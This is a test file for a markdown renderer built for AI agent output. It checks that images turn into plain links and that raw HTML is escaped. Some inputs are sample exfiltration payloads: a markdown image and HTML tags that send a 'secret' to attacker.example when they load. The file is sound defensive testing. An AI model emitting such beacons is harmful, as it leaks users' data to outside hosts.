import { describe, expect, it } from 'vitest'
import { Marked } from 'marked'
import { renderAgentMarkdown } from './render'

const stock = new Marked({ gfm: true })

describe('renderAgentMarkdown', () => {
  it('turns images into plain links, so nothing loads on render', () => {
    const html = renderAgentMarkdown('![leak](https://attacker.example/p?d=secret)')
    expect(html).not.toContain('<img')
    expect(html).toContain('<a href="https://attacker.example/p?d=secret">leak</a>')
  })

  it('keeps one anchor pointing at the link target for linked images, at any depth', () => {
    for (const md of ['[![CI](https://x.example/b.svg)](https://ci.example/run)', '[**![CI](https://x.example/b.svg)**](https://ci.example/run)', '[_![CI](https://x.example/b.svg)_](https://ci.example/run)']) {
      const html = renderAgentMarkdown(md)
      expect(html.match(/<a /g)).toHaveLength(1)
      expect(html).toContain('href="https://ci.example/run"')
      expect(html).not.toContain('x.example')
    }
  })

  it('renders ordinary links exactly like stock marked', () => {
    for (const md of ['[x](https://a.example/?b=1&amp;c=2)', '[t](https://a.example "A &amp; B")', '<https://a.example/?b=1&c=2>', 'see https://a.example/x']) {
      expect(renderAgentMarkdown(md)).toBe(stock.parse(md, { async: false }))
    }
  })

  it('renders a standalone image exactly like the equivalent stock link', () => {
    for (const [img, link] of [
      ['![a & b](https://x.example/?q=1&amp;r=2 "T &amp; U")', '[a & b](https://x.example/?q=1&amp;r=2 "T &amp; U")'],
      ['![](https://x.example/i.png)', '[https://x.example/i.png](https://x.example/i.png)'],
      ['![ci](<https://x.example/a b.svg>)', '[ci](<https://x.example/a b.svg>)'],
    ]) {
      expect(renderAgentMarkdown(img)).toBe(stock.parse(link, { async: false }))
    }
  })

  it('shows raw HTML as text instead of parsing it', () => {
    const html = renderAgentMarkdown('<img src="https://attacker.example/x"> and <div style="background:url(https://attacker.example/y)">z</div>')
    expect(html).not.toMatch(/<img|<div/)
    expect(html).toContain('&#60;img')
  })
})
